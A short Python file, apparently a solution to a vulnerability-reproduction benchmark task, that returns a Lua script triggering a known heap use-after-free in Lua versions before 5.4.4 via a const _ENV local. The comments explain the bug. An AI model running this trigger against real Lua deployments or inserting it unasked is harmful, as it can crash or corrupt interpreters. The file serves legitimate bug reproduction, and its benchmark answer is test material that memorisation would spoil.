import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the Heap Use After Free vulnerability in Lua
        related to _ENV <const> declaration (arvo:44597 / OSS-Fuzz 44597).
        """
        # The vulnerability exists because Lua (versions < 5.4.4) generates incorrect code
        # when _ENV is a local const variable. It fails to create a proper UpValue for the
        # object assigned to _ENV, causing it to be garbage collected while still being
        # referenced by the closure. Accessing it triggers a UAF.
        
        poc = (
            b'local function trigger()\n'
            b'  local payload = { callback = function() end }\n'
            b'  local _ENV <const> = payload\n'
            b'  return function()\n'
            b'    return callback()\n'
            b'  end\n'
            b'end\n'
            b'local f = trigger()\n'
            b'collectgarbage()\n'
            b'f()\n'
        )
        return poc